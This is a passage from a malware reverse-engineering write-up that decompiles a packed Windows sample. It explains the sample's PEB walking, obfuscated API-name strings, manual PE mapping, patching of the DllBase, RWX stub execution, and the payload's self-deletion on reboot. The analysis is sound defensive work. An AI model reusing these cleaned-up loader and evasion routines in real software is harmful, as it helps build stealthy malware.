`sub_402883` seems to just be an implementation of `GetProcessAddr` to slow down the analysis of the malware. So, the first call (whose result is assigned to v7) seems to be getting the RVA of GetProcAddress from the Kernel32 module. We assume it is a RVA, because right after we can see `v7 += lastVisitedModule[6]`, and `lastVisitedModule[6]` is the module's base address - this is adding the module's base address to the relative virtual address of GetProcAddress, thus `v7` after the if statement contains the actual virtual address of `GetProcAddressr`.

Of course the lines right after this are doing the same: `v5` ends up being the virtual address of `LoadLibraryA` from the `Kernel32` module.
Finally, at the end of **Code 10**, we can see that both the Kernel32's `GetProcAddress` and `LoadLibraryA` virtual addresses are stored inside the function arguments `a2` and `a3`.

We can now rewrite **Code 10** with better variable and function names:
#### Code 14
```cpp
void __cdecl Retrieve_GetProcAddr_LoadLibrary_FromKernel32(
        char *currentPleb,
        _DWORD *GetProcAddress_VA,
        int *LoadLibraryA_VA)
{
  _DWORD *modulePointer; // [esp+7h] [ebp-4Dh]
  int LoadLibraryA_VirtualAddress; // [esp+Bh] [ebp-49h]
  __int16 Kernel32String[9]; // [esp+Fh] [ebp-45h] BYREF
  int GetProcAddress_VirtualAddress; // [esp+21h] [ebp-33h]
  unsigned __int8 GetProcAddressString[15]; // [esp+29h] [ebp-2Bh] BYREF
  _DWORD *lastVisitedModule; // [esp+38h] [ebp-1Ch]
  char *moduleInfo; // [esp+3Ch] [ebp-18h]
  unsigned __int8 LoadLibraryAString[13]; // [esp+40h] [ebp-14h] BYREF
  _DWORD *FlinkPtr; // [esp+4Dh] [ebp-7h]

  lastVisitedModule = 0;
  FlinkPtr = 0;
  Kernel32String[0] = -30;
  Kernel32String[1] = -4;
  Kernel32String[2] = 9;
  Kernel32String[3] = 5;
  Kernel32String[4] = -4;
  Kernel32String[5] = 3;
  Kernel32String[6] = -54;
  Kernel32String[7] = -55;
  Kernel32String[8] = 0;
  LoadLibraryAString[0] = -29;
  LoadLibraryAString[1] = 6;
  LoadLibraryAString[2] = -8;
  LoadLibraryAString[3] = -5;
  LoadLibraryAString[4] = -29;
  LoadLibraryAString[5] = 0;
  LoadLibraryAString[6] = -7;
  LoadLibraryAString[7] = 9;
  LoadLibraryAString[8] = -8;
  LoadLibraryAString[9] = 9;
  LoadLibraryAString[10] = 16;
  LoadLibraryAString[11] = -40;
  LoadLibraryAString[12] = 0;
  GetProcAddressString[0] = -34;
  GetProcAddressString[1] = -4;
  GetProcAddressString[2] = 11;
  GetProcAddressString[3] = -25;
  GetProcAddressString[4] = 9;
  GetProcAddressString[5] = 6;
  GetProcAddressString[6] = -6;
  GetProcAddressString[7] = -40;
  GetProcAddressString[8] = -5;
  GetProcAddressString[9] = -5;
  GetProcAddressString[10] = 9;
  GetProcAddressString[11] = -4;
  GetProcAddressString[12] = 10;
  GetProcAddressString[13] = 10;
  GetProcAddressString[14] = 0;
  LoadLibraryA_VirtualAddress = 0;
  GetProcAddress_VirtualAddress = 0;
  addValueToBuffer((char *)Kernel32String, 8u, 0x69u);
  addValueToBuffer2((int)GetProcAddressString, 0xEu, 105);
  addValueToBuffer2((int)LoadLibraryAString, 0xCu, 105);
  FlinkPtr = (_DWORD *)(*((_DWORD *)currentPleb + 3) + 12);
  modulePointer = (_DWORD *)*FlinkPtr;
  while ( 1 )
  {
    lastVisitedModule = modulePointer;
    moduleInfo = (char *)modulePointer[12];
    if ( !areStringsEqual((int)moduleInfo, (int)Kernel32String) )
      break;
    modulePointer = (_DWORD *)*modulePointer;
    if ( modulePointer == FlinkPtr )
      goto LABEL_6;
  }
  moduleInfo = (char *)lastVisitedModule[6];    // lastVisitedModule here is Kernel32
  GetProcAddress_VirtualAddress = GetProcAddressImpl(moduleInfo, GetProcAddressString);
  if ( GetProcAddress_VirtualAddress )
  {
    GetProcAddress_VirtualAddress += lastVisitedModule[6];
    LoadLibraryA_VirtualAddress = GetProcAddressImpl((char *)lastVisitedModule[6], LoadLibraryAString);
    if ( LoadLibraryA_VirtualAddress )
      LoadLibraryA_VirtualAddress += lastVisitedModule[6];
  }
LABEL_6:
  if ( LoadLibraryA_VirtualAddress )
  {
    if ( GetProcAddress_VirtualAddress )
    {
      *LoadLibraryA_VA = LoadLibraryA_VirtualAddress;
      *GetProcAddress_VA = GetProcAddress_VirtualAddress;
    }
  }
}
```
We can also rewrite **Code 8** as:
```cpp
HeapFreeFn(&tempBuffer);
currentPleb = (int)NtCurrentPeb();
if ( !Retrieve_GetProcAddr_LoadLibrary_FromKernel32(currentPleb, &GetProcessAddressVA, &LoadLibraryA_VA) )
```

The next lines of the main function that we're analiyzing (from **Code 2**):
```cpp
addValueToBuffer2(v28, 11, 105);
addValueToBuffer2(v10, 14, 105);
addValueToBuffer2(v22, 12, 105);
addValueToBuffer2(v29, 15, 105);
addValueToBuffer2(v21, 12, 105);
v5 = LoadLibraryA_VA(v21);
v16 = v5;
if ( v5 )
```
We already know that `addValueToBuffer` is adding 105 to each element of arrays v28, v10, v22, v29 and v21. And as we said before, each element from each array will become an ASCII character after adding 105 to the original element - thus, v28, v10, v22, v29 and v21 are just strings. If we check their values through the debugger, we can rename the above code to:
```cpp
addValueToBuffer2(VirtualFreeStr, 11, 105);
addValueToBuffer2(VirtualProtectStr, 14, 105);
addValueToBuffer2(VirtualAllocStr, 12, 105);
addValueToBuffer2(UnmapViewOfFileStr, 15, 105);
addValueToBuffer2(Kernel32dllStr, 12, 105);
Kernel32Handle = LoadLibraryA_VA(VirtualAllocStr);
Kernel32Handle2 = Kernel32Handle;
if ( Kernel32Handle )
```

Let's analyze **Code 2** further:
```cpp
if ( Kernel32Handle )
{
  dword_40C2AC = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))GetProcessAddressVA(v16, VirtualFreeStr);
  v12 = (void (__cdecl *)(char *, int, int, int *))GetProcessAddressVA(v16, VirtualProtectStr);
  v13 = (int (__cdecl *)(_DWORD, int, int, int))GetProcessAddressVA(v16, VirtualAllocStr);
  v8 = GetProcessAddressVA(v16, UnmapViewOfFileStr);
  ```
This does not need explanations and can be rewritten directly as:
```cpp
if ( Kernel32Handle )
{
  VirtualFree = (BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD))GetProcessAddressVA(
                                                             Kernel32Handle2,
                                                             VirtualFreeStr);
  VirtualProtect = (void (__cdecl *)(char *, int, int, int *))GetProcessAddressVA(
                                                                Kernel32Handle2,
                                                                VirtualProtectStr);
  VirtualAlloc2 = (int (__cdecl *)(_DWORD, SIZE_T, int, int))GetProcessAddressVA(
                                                               Kernel32Handle2,
                                                               VirtualAllocStr);
  UnmapViewOfFile = GetProcessAddressVA(Kernel32Handle2, UnmapViewOfFileStr);
```

Next we have:
#### Code 15
```cpp
for ( i = (char *)((unsigned int)sub_4015F3 & 0xFFFFF000); ; i -= 4096 )
{
  if ( *(_WORD *)i == 0x5A4D )
  {
    capacity_buffer = *(unsigned __int16 *)&i[*((_DWORD *)i + 15)];
    if ( (unsigned __int8)capacity_buffer == 80 )
      break;
  }
}
```
Note that `sub_4015F3` here is just the function that we're analyzing (**Code 2**). `i` is therefore it's address.
This part of **Code 2** requires a basic understanding of virtual addresses and pages. This is a drawing I made to show its basics and what's relevant for the analysis:
#### Picture 1
<img width="1031" height="541" alt="virtualAddress" src="https://github.com/user-attachments/assets/a167a950-f33b-4444-a11f-a7dc68c58180" />

Note that the program we're analyzing statically in IDA doesn't have its own virtual address yet - what we're analyzing is the "Program" part in the picture above.

Once again we have this:
```cpp
for ( i = (char *)((unsigned int)sub_4015F3 & 0xFFFFF000); ; i -= 4096 )
```
At runtime, the function `sub_4015F3` will have its own virtual address. And if we look at the above picture agin, we now know why this assignment is using `& 0xFFFF000`: this part is just getting the **page number** (where the `sub_4015F3` function lives at runtime in the address space of the process) and setting the offset to 0.

Next, `i` is decremented by 4096 - and 4096 is usually a page's size. But why is the program taking only the page number and removing the offset of the function within it?

This can be understood by checking the next instruction:
```cpp
if ( *(_WORD *)i == 0x5A4D ) {
```
...This is just checking whether `i` contains the "MZ" signature, which marks the beginning of a PE in memory (at runtime). And here's the catch: processes are usually aligned to pages - which means that the start of a process is almost always at the start of a page. This is why the program is removing any offset of the function's VA and then decrementing `i` by `4096`: it is looking if the current page's start contains the beginning of the PE in memory - and if it does, the program just found the module base address. (The first 2 bytes of a module base for PE files is the "MZ" signature!).

If the current page's start doesn't contain the MZ signature, then `- 4096` will just check the previous page's start (since once again, we know that the offset in the current page is `0`, which is just the page's start).

Then the program does:
```cpp
capacity_buffer = *(unsigned __int16 *)&i[*((_DWORD *)i + 15)];
if ( (unsigned __int8)capacity_buffer == 80 )
  break;
```
First, `(DWORD*)i` just treats `i` as a 4 byte pointer - `i` is the start of the `DOS` header (whose first 2 bytes contain the "MZ" signature). (See here for the DOS header: https://0xrick.github.io/win-internals/pe3/)

Since `i` is now treated as a 4 byte pointer, `+15` is just `DOS header begin + 15*4 bytes`, i.e. `DOS header begin + 60 bytes`, i.e. `DOS header begin + 0x3C bytes`. This happens to be `e_lfanew` in the DOS header, which contains the offset to the PE header, where the NT headers start.

The first 2 bytes of any valid PE process in the NT headers will be "PE", i.e. 0x5045. And in the code we are checking the first byte ("P"), i.e. 80, i.e. `0x50`.
In fact this: `&i[*((_DWORD *)i + 15)];` is just moving the module base address (where the MZ signature starts) to the found offset inside `e_lfanew`, so this retrieves the start of the NT headers. 

And as we said, `if ( (unsigned __int8)capacity_buffer == 80 )` is just checking that the NT headers start with "P" - if they don't, the found process isn't a valid PE file and the program keeps searching on the next page.

We can now rewrite **Code 15** as follows:
```cpp
for ( CurrentProcessImageBase = (char *)((unsigned int)sub_4015F3 & 0xFFFFF000); ; CurrentProcessImageBase -= 4096 )
{ // Get current page start address
  if ( *(_WORD *)CurrentProcessImageBase == 0x5A4D )
  { // If current page start == "MZ"
    capacity_buffer = *(unsigned __int16 *)&CurrentProcessImageBase[*((_DWORD *)CurrentProcessImageBase + 15)];
    if ( (unsigned __int8)capacity_buffer == 80 )
      break; // If NT header of current process starts with "P" (PE), the current image base is that of a valid PE 
  }
}
```

Let's proceed with our main analysis.
#### Code 16
```cpp
if ( checkValidPe32AndUpdateArgs(CurrentProcessImageBase, &v23, 0, 0) )
{
  v19 = *((_WORD *)v23 + 9);
  if ( (v19 & 0x2000) != 0 )
  {
    v17 = HeapAllocFn(0x1Cu);
    if ( v17 )
    {
      v17[2] = GetProcessAddressVA;
      v17[3] = LoadLibraryA_VA;
      v17[5] = VirtualAlloc2;
      v17[6] = VirtualFree;
      v17[4] = VirtualProtect;
      v17[1] = decryptedBytes;
```
We already analyzed `checkValidPe32AndUpdateArgs`, and we know that the second argument will be updated in the function to contain the current process' NT Image File Header.
As we saw before, the IMAGE_FILE_HEADER for x86 is
```cpp
typedef struct _IMAGE_FILE_HEADER {
    WORD    Machine; // offset 0
    WORD    NumberOfSections; // offset 2
    DWORD   TimeDateStamp; // offset 4
    DWORD   PointerToSymbolTable; // offset 8
    DWORD   NumberOfSymbols; // offset 12
    WORD    SizeOfOptionalHeader; // offset 16
    WORD    Characteristics; // offset 18
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
```
Thus, `v19 = *((_WORD *)v23 + 9);` is `v19 = *((_BYTE *)v23 + 18);`, and we can see that at offset 12 there's `Characteristics`.

According to the Microsoft docs (https://learn.microsoft.com/en-us/windows/win32/debug/pe-format), Characteristics contain some flags. Specifically `0x2000` (what's being checked by the malware) is the `IMAGE_FILE_DLL` flag.
Thus the malware is checking whether the current process (ie. the one we're analyzing) is a DLL. If it is, the if branch is entered.

## Case 1: The malware (process) is a DLL
We can rewrite **Code 16** as:
```cpp
if ( (NtCharacteristics & 0x2000) != 0 )
{ // If this process is a DLL
  localBuffer = HeapAllocFn(28u);
  if ( localBuffer )
  {
    localBuffer[2] = GetProcessAddressVA;
    localBuffer[3] = LoadLibraryA_VA;
    localBuffer[5] = VirtualAlloc2;
    localBuffer[6] = VirtualFree;
    localBuffer[4] = VirtualProtect;
    localBuffer[1] = decryptedBytes;
```
Next:
#### Code 17
```cpp
if ( checkValidPe32AndUpdateArgs(decryptedBytes, 0, &v16, 0) )
{
  dwSize = *((_DWORD *)v16 + 14);
  lpAddress = (LPVOID)VirtualAlloc2(0, dwSize, 4096, 64);
  if ( lpAddress )
  {
    dword_40C2A8 = (int)CurrentProcessImageBase;
    *localBuffer = lpAddress;
    dword_40C2B8 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))((char *)lpAddress + *((_DWORD *)v16 + 4));
    sub_401E3C(currentPleb, CurrentProcessImageBase, lpAddress);
    v24 = sub_40100F(localBuffer);
    HeapFreeFn((void **)&decryptedBytes);
    HeapFreeFn((void **)&localBuffer);
  }
```
We know that `v16` must be a pointer to `NtOptionalHeader` as we've already analyzed `checkValidPe32AndUpdateArgs`. (Also note that `v16` has type `char*` in the decompiled code).

If we look at the `NtOptionalHeader` struct, we know that at offset `56` there's `SizeOfImage`. So our decrypted bytes that we found before represent a PE.
It looks like the malware is trying to load a DLL represented by the decrypted bytes. 

`dword_40C2B8 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))((char *)lpAddress + *((_DWORD *)v16 + 4));` is pretty much taking the entry point from the optional header in the decrypted bytes (`OptionalHeader + 16` leads to `AddressOfEntryPoint`, then storing in a global variable.

The next line:
```cpp
sub_401E3C(currentPleb, CurrentProcessImageBase, lpAddress);
```
Leads to:
```cpp
int __cdecl sub_401E3C(char *pebStructure, int currentImageBase, int buffer)
{
  _DWORD *v4; // [esp+0h] [ebp-Ch]
  _DWORD *v5; // [esp+4h] [ebp-8h]

  v4 = (_DWORD *)(*((_DWORD *)pebStructure + 3) - 42 + 54);// FlinkPtr
  v5 = (_DWORD *)*v4;
  do
  {
    if ( v5[6] == currentImageBase )
    {
      v5[6] = buffer;
      return 1;
    }
    v5 = (_DWORD *)*v5;
  }
  while ( v5 != v4 );
  return 0;
}
```
This is using offsets that we already analyzed before (see section starting from **Code 13**). So we already know that `v4` is FlinkPtr from the PEB Structure, and that `v5` is the first entry in the linked list. We also know that `v5[6]` is DllBase: so this function is updating the module base of the given process (in this case, the process that we're analyzing, i.e. the malware) to point to our newly allocated buffer (`lpAddress`). Let's rename some variable and function names and we get:
```cpp
int __cdecl UpdateDllBase(char *pebStructure, int currentImageBase, int newDllBasePointee)
{
  _DWORD *FlinkPtr; // [esp+0h] [ebp-Ch]
  _DWORD *Entry; // [esp+4h] [ebp-8h]

  FlinkPtr = (_DWORD *)(*((_DWORD *)pebStructure + 3) - 42 + 54);// FlinkPtr
  Entry = (_DWORD *)*FlinkPtr;
  do
  {
    if ( Entry[6] == currentImageBase )
    { // update current DllBase to point to our new buffer
      Entry[6] = newDllBasePointee;
      return 1;
    }
    Entry = (_DWORD *)*Entry;
  }
  while ( Entry != FlinkPtr );
  return 0;
}
```

Let's proceed with **Code 17**:
```cpp
 v24 = sub_40100F(localBuffer);
 ```
We won't fully analyze the function as it's very lengthy, so I will just post the function with (already) renamed names:
First of all, let's write locaBuffer as a structure:
#### Code 18 - LocalBuffer structure
```cpp
struct LocalBuffer {
  void* imageBase;
  char* decryptedBytes; // bytes that describe the DLL that's being loaded
  void* GetProcessAddressVA;
  void* LoadLibraryAVA;
  void* VirtualProtectVA;
  void* VirtualAllocVA;
  void* VirtualFreeVA;
```
Let's now see what `sub_40100F` does (with already renamed names). The logic to find what each variable is is identical as before, we just need to find offsets into the PE headers and everything becomes clear.
#### Code 19 
```cpp
int __stdcall ConstructPE_AndExecute(char **localBuffer)
{
  char v2; // [esp-5Dh] [ebp-61h] BYREF
  int entryPoint; // [esp-3Eh] [ebp-42h]
  int newFlag; // [esp-3Ah] [ebp-3Eh]
  unsigned __int16 NumberOfSections; // [esp-36h] [ebp-3Ah]
  char *NtOptionalHeader; // [esp-34h] [ebp-38h] BYREF
  char *currentSectionHeader; // [esp-30h] [ebp-34h]
  char *NtImageHeader; // [esp-2Ch] [ebp-30h] BYREF
  char *ImageSectionHeader; // [esp-28h] [ebp-2Ch] BYREF
  char *sectionDataPtr; // [esp-24h] [ebp-28h]
  unsigned int i; // [esp-20h] [ebp-24h]
  char *v12; // [esp-1Ch] [ebp-20h]
  int v13; // [esp-18h] [ebp-1Ch]
  unsigned int CanSectionBeWrittenTo; // [esp-14h] [ebp-18h]
  int SectionSizeMinus2; // [esp-10h] [ebp-14h]
  int CanSectionBeRead; // [esp-Ch] [ebp-10h]
  int CanSectionBeExecuted; // [esp-8h] [ebp-Ch]
  char *DosNtOptionalHeadersPtr; // [esp-4h] [ebp-8h] BYREF

  i = 0;
  NumberOfSections = 0;
  DosNtOptionalHeadersPtr = 0;
  newFlag = 0;
  NtImageHeader = 0;
  NtOptionalHeader = 0;
  ImageSectionHeader = 0;
  v13 = -1;
  entryPoint = 0;
  sectionDataPtr = 0;
  SectionSizeMinus2 = 0;
  CanSectionBeRead = 0;
  CanSectionBeWrittenTo = 0;
  CanSectionBeExecuted = 0;
  memsetFn(&v2, 0, 0x1Fu);
  if ( checkValidPe32AndUpdateArgs(localBuffer[1], &NtImageHeader, &NtOptionalHeader, &ImageSectionHeader) )
  {
    NumberOfSections = *((_WORD *)NtImageHeader + 1);
    memcopy(*localBuffer, localBuffer[1], ImageSectionHeader - localBuffer[1]);// localBuffer contains: decryptedBytes DOS + NT + Optional headers
    DosNtOptionalHeadersPtr = *localBuffer;
    if ( resolveImportTable(
           localBuffer[1],                      // decryptedBytes
           (int)DosNtOptionalHeadersPtr,
           (int (__stdcall *)(int))localBuffer[3],// LoadLibraryAVA
           (int (__stdcall *)(int, int))localBuffer[2]) )// GetProcessAddressVA
    {
      for ( i = 0; i < NumberOfSections; ++i )
      {
        currentSectionHeader = &ImageSectionHeader[40 * i];
        memcopy(
          &(*localBuffer)[*((_DWORD *)currentSectionHeader + 3)],
          &localBuffer[1][*((_DWORD *)currentSectionHeader + 5)],
          *((_DWORD *)currentSectionHeader + 4));// basically copies section's data
      }
      if ( ApplyRelocations(*localBuffer) )
      {
        for ( i = 0; i < NumberOfSections; ++i )
        {
          currentSectionHeader = &ImageSectionHeader[40 * i];
          DosNtOptionalHeadersPtr = (char *)*((_DWORD *)currentSectionHeader + 9);// section Characteristics
          CanSectionBeRead = (unsigned int)DosNtOptionalHeadersPtr & 0x40000000;// see flags in MicrosoftDocs
          CanSectionBeWrittenTo = (unsigned int)DosNtOptionalHeadersPtr & 0x80000000;
          CanSectionBeExecuted = (unsigned int)DosNtOptionalHeadersPtr & 0x20000000;
          if ( ((unsigned int)DosNtOptionalHeadersPtr & 0x40000000) != 0
            && CanSectionBeWrittenTo
            && CanSectionBeExecuted )
          {
            newFlag = 64;
          }
          else if ( CanSectionBeRead && !CanSectionBeWrittenTo && CanSectionBeExecuted )
          {
            newFlag = 32;
          }
          else if ( CanSectionBeRead && CanSectionBeWrittenTo && !CanSectionBeExecuted )
          {
            newFlag = 4;
          }
          else if ( CanSectionBeRead && !CanSectionBeWrittenTo && !CanSectionBeExecuted )
          {
            newFlag = 2;
          }
          sectionDataPtr = &(*localBuffer)[*((_DWORD *)currentSectionHeader + 3)];
          SectionSizeMinus2 = *((_DWORD *)currentSectionHeader + 2) - 2;
          if ( !((int (__cdecl *)(char *, int, int, char **))localBuffer[4])(
                  sectionDataPtr,
                  SectionSizeMinus2,
                  newFlag,
                  &DosNtOptionalHeadersPtr) )   // Write the new flag for this section
            break;
        }
        v12 = *localBuffer;
        entryPoint = *((_DWORD *)NtOptionalHeader + 4);
        return ((int (__cdecl *)(char *, int, _DWORD))&v12[entryPoint])(v12, 1, 0);// exec entry point
      }
    }
  }
  return v13;
}
```
In brief, the function reconstructs the PE (from the decrypted bytes) and executes it. So this is loading the bytes.

**Code 17** can now be rewriten more clearly as:
#### Code 20 - Code 17 rewritten
```cpp
 if ( checkValidPe32AndUpdateArgs(decryptedBytes, 0, &v16, 0) )
{
  dwSize = *((_DWORD *)v16 + 14);
  lpAddress = (LPVOID)VirtualAlloc2(0, dwSize, 4096, 64);
  if ( lpAddress )
  {
    currentProcessImageBase1 = (int)CurrentProcessImageBase;
    *localBuffer = lpAddress;
    dword_40C2B8 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))((char *)lpAddress + *((_DWORD *)v16 + 4));
    UpdateDllBase(currentPleb, CurrentProcessImageBase, lpAddress);
    peReconstructedAndRanSuccessfully = ConstructPE_AndExecute(localBuffer);
    HeapFreeFn((void **)&decryptedBytes);
    HeapFreeFn((void **)&localBuffer);
  }
```

### Summary of what happens in case the current process is a DLL:
```cpp
if ( (NtCharacteristics & 0x2000) != 0 )
{ // If this process is a DLL
  localBuffer = (char **)HeapAllocFn(28u);
  if ( localBuffer )
  {
    localBuffer[2] = (char *)GetProcessAddressVA;
    localBuffer[3] = (char *)LoadLibraryA_VA;
    localBuffer[5] = VirtualAlloc2;
    localBuffer[6] = (char *)VirtualFree;
    localBuffer[4] = VirtualProtect;
    localBuffer[1] = decryptedBytes;
    if ( checkValidPe32AndUpdateArgs(decryptedBytes, 0, &v16, 0) )
    {
      dwSize = *((_DWORD *)v16 + 14);
      lpAddress = (LPVOID)((int (__cdecl *)(_DWORD, SIZE_T, int, int))VirtualAlloc2)(
                            0,
                            dwSize,
                            4096,
                            64);
      if ( lpAddress )
      {
        currentProcessImageBase1 = (int)CurrentProcessImageBase;
        *localBuffer = (char *)lpAddress;
        dword_40C2B8 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))((char *)lpAddress + *((_DWORD *)v16 + 4));
        UpdateDllBase((char *)currentPleb, (int)CurrentProcessImageBase, (int)lpAddress);
        peReconstructedAndRanSuccessfully = ConstructPE_AndExecute(localBuffer);
        HeapFreeFn((void **)&decryptedBytes);
        HeapFreeFn((void **)&localBuffer);
      }
```

This is what we know so far. 
### If the process of the malware that we're analyzing is a DLL (ie. the malware ran as a DLL):
- The PE headers are validated,
- Memory is allocated for the PE image,
- The current PE DllBase is updated to point to the new memory,
- This new memory gets constructed from `decryptedBytes` to create a new fresh PE,
- The new PE is executed.

## Case 2: The malware (process) is not a DLL
After checking with a debugger, we see that this is the actual path taken by program.
#### Code 20
```cpp
else if ( resolveImportTable(decryptedBytes, (int)CurrentProcessImageBase, (int (__stdcall *)(int))LoadLibraryA_VA,(int (__stdcall *)(int, int))GetProcessAddressVA) )
{ // malware process isn't DLL but an EXE
  v10 = (char *)sub_40267A - (char *)sub_4022C0;
  v25 = (char *)((int (__cdecl *)(_DWORD, int, int, int))VirtualAlloc2)(0, dword_409048 + (char *)sub_40267A - (char *)sub_4022C0, 4096, 4);
  if ( v25 )
  {
    memcopy(v25, (char *)sub_4022C0, v10);
    memcopy(&v25[v10], decryptedBytes, dword_409048);
    HeapFreeFn((void **)&decryptedBytes);
    if ( checkValidPe32AndUpdateArgs(CurrentProcessImageBase, 0, &v16, 0) && checkValidPe32AndUpdateArgs(&v25[v10], 0, v6, 0) )
    {
      ((void (__cdecl *)(char *, int, int, int *))VirtualProtect)(v25, dword_409048 + v10, 64, &capacity_buffer);
      ((void (__cdecl *)(char *, char *, BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD), char *, char *, int, char *, int))v25)(
        &v25[v10], CurrentProcessImageBase, VirtualFree, VirtualProtect, VirtualAlloc2, UnmapViewOfFile, v25, a4);
    }
  }
```
First of all, `v10` is a size/offset computed at runtime. We know it's a size or offset thanks to the `memcopy` lines after, and it's calculated at runtime because the calculation requires 2 virtual addresses. 
The next line allocates some memory for the `v25` buffer.

Next we have this interesting part:
```cpp
memcopy(v25, (char *)sub_4022C0, v10);
memcopy(&v25[v10], decryptedBytes, dword_409048);
```
So seemingly `v10` is the size of a .code region between `sub_40267A` and `sub_4022C0`. The contents from this .code region are then copied into `v25`.
Right after this, the program copies the decryptedBytes (which we found before) and decryptedBytes has size `dword_409048`.

This looks like a stub/payload combination. In fact, if we check the next few lines:
```cpp
if ( checkValidPe32AndUpdateArgs(CurrentProcessImageBase, 0, &v16, 0) && checkValidPe32AndUpdateArgs(&v25[v10], 0, v6, 0) )
{
  ((void (__cdecl *)(char *, int, int, int *))VirtualProtect)(v25, dword_409048 + v10, 64, &capacity_buffer);
  ((void (__cdecl *)(char *, char *, BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD), char *, char *, int, char *, int))v25)(
    &v25[v10], CurrentProcessImageBase, VirtualFree, VirtualProtect, VirtualAlloc2, UnmapViewOfFile, v25, a4);
}
```
We can sort of confirm this through the next lines where `VirtualProtect` is called.

From the Microsoft Docs (https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants), we can see that the third argument `newProtect`, i.e. "64" or 0x40 is just changing the page's protection to `PAGE_EXECUTE_READWRITE` => the VirtualProtect call there  is just making the memory at `v25` executable and writable, so the code that was copied in `v25` is now ready to run.
Finally:
```cpp
((void (__cdecl *)(char *, char *, BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD), char *, char *, int, char *, int))v25)(
&v25[v10], CurrentProcessImageBase, VirtualFree, VirtualProtect, VirtualAlloc2, UnmapViewOfFile, v25, a4);
```
This just executes `v25`, and the start of `v25` is what we assume to be a stub that will load the payload. The first argument is indeed the payload `&v25[v10]`.
So this seems to executing the stub, that will perform further actions and finally execute the payload, i.e. our `decryptedBytes`.

Let's make **Code 20** nicer:
```cpp
else if ( resolveImportTable(decryptedBytes, (int)CurrentProcessImageBase, (int (__stdcall *)(int))LoadLibraryA_VA,(int (__stdcall *)(int, int))GetProcessAddressVA) )
{// malware process isn't DLL but an EXE
stubSize = (char *)sub_40267A - (char *)sub_4022C0;
buffer = (char *)((int (__cdecl *)(_DWORD, int, int, int))VirtualAlloc2)(0,payloadSize + (char *)sub_40267A - (char *)sub_4022C0,4096,4);
if ( buffer )
{
  memcopy(buffer, (char *)sub_4022C0, stubSize);
  memcopy(&buffer[stubSize], decryptedBytes, payloadSize);
  HeapFreeFn((void **)&decryptedBytes);
  if ( checkValidPe32AndUpdateArgs(CurrentProcessImageBase, 0, &v16, 0) && checkValidPe32AndUpdateArgs(&buffer[stubSize], 0, v6, 0) )
  {
    ((void (__cdecl *)(char *, int, int, int *))VirtualProtect)(buffer,payloadSize + stubSize,64,&capacity_buffer);
    ((void (__cdecl *)(char *, char *, BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD), char *, char *, int, char *, int))buffer)(
      &buffer[stubSize],CurrentProcessImageBase,VirtualFree,VirtualProtect,VirtualAlloc2,UnmapViewOfFile,buffer,a4);
  }
```

### If the current process isn't a DLL:
- The malware retrieves what we assume is a stub from a .code region,
- It retrieves the payload through `decryptedBytes`,
- It makes the memory region starting from the stub executable and writable,
- It executes the stub, which itself will perform further actions and finally execute the payload.

The assumption is that the payload is what contains the real malware code, and payload = `decryptedBytes`.
I assume that what the stub does is identical to what happens when the current process is a DLL: the payload is resolved and executed.

Let's now try to dump `decryptedBytes` up to `payloadSize` and try to analyze the dump in IDA.
Specifically, we need to find the values for `stubSize`, `buffer` (its address at runtime). `payloadSize` is a constant with value 0x3E00.

```cpp
stubSize = 0x000003BA
buffer = 0x00560000  // changes at each execution
payloadSize = 0x3E00
payloadStart = buffer[stubSize] = 0x00560000 + 0x000003BA = 0x005603BA
payloadEnd = buffer[stubSize] + payloadSize = 0x005603BA + 0x3E00 - 1 = 0x005641B9
```
Now with WinDbg we can just dump from payloadStart to payloadEnd with `.writemem C:\dump\payload.bin 0x005603BA 0x005641B9`

# Analyzing the payload
#### Code 21 - payload EP
```cpp
int __cdecl start(HMODULE hModule)
{
  CHAR ClassName[16]; // [esp+0h] [ebp-5Ch] BYREF
  __int128 WindowName; // [esp+10h] [ebp-4Ch] BYREF
  WNDCLASSEXA WndClass; // [esp+24h] [ebp-38h] BYREF
  HMODULE ModuleHandleA; // [esp+54h] [ebp-8h]
  HWND hWnd; // [esp+58h] [ebp-4h]

  ModuleHandleA = 0;
  strcpy(ClassName, "4)0=DiMQ212)E+5");
  strcpy((char *)&WindowName, "Updating ...");
  hWnd = 0;
  memset(&WndClass, 0, sizeof(WndClass));
  ModuleHandleA = GetModuleHandleA("regsvr32.exe");
  if ( !ModuleHandleA )
  {
    WndClass.cbSize = 48;
    WndClass.style = 3;
    WndClass.lpfnWndProc = sub_401480;
    memset(&WndClass.cbClsExtra, 0, 12);
    WndClass.lpszClassName = ClassName;
    RegisterClassExA(&WndClass);
    hWnd = CreateWindowExA(
             0,
             ClassName,
             (LPCSTR)&WindowName,
             0x80000000,
             0x80000000,
             0x80000000,
             0x80000000,
             0x80000000,
             0,
             0,
             0,
             0);
    ShowWindow(hWnd, 5);
    UpdateWindow(hWnd);
    sub_401F70(0);
    sub_401570(
      *(_DWORD *)ClassName,
      *(_DWORD *)&ClassName[4],
      *(_DWORD *)&ClassName[8],
      *(_DWORD *)&ClassName[12],
      WindowName,
      DWORD1(WindowName),
      DWORD2(WindowName),
      HIDWORD(WindowName));
  }
  sub_401F70(hModule);
  return 1;
}
```

Nothing interesting happens up until the last few functions.
This code just creates a new window and indeed if we run the payload through the debugger we'll see an "Updating..." window.

If we check the first sub `sub_401F70`:
#### Code 22 - Payload's heart
```cpp
const CHAR *__cdecl sub_401F70(HMODULE hModule)
{
  const CHAR *result; // eax
  CHAR *lpExistingFileName; // [esp+0h] [ebp-4h]

  result = (const CHAR *)GetModulePath(hModule);
  lpExistingFileName = (CHAR *)result;
  if ( result )
  {
    MoveFileExA(result, 0, 4u);
    return (const CHAR *)sub_401F50(lpExistingFileName);
  }
  return result;
}
```
This is just retrieving the given module's path and then marking it to be deleted on the next reeboot. 
Thus, basically in **code 21**:
```cpp
UpdateWindow(hWnd);
    DeleteFileAfterReboot(0);
    sub_401570(
      *(_DWORD *)ClassName,
      *(_DWORD *)&ClassName[4],
      *(_DWORD *)&ClassName[8],
      *(_DWORD *)&ClassName[12],
      WindowName,
